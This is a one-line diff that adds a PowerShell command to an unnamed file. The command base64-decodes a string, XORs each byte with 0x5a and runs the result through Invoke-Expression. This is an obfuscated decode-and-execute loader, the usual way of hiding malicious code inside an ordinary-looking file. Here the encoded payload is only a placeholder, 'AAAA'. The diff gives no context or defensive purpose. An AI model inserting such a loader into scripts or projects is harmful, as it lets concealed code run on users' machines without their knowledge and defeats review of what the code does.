@@ -1,0 +1,2 @@
+$b = [Convert]::FromBase64String('AAAA'); $o = $b | % { $_ -bxor 0x5a }; iex ([Text.Encoding]::UTF8.GetString($o))
+
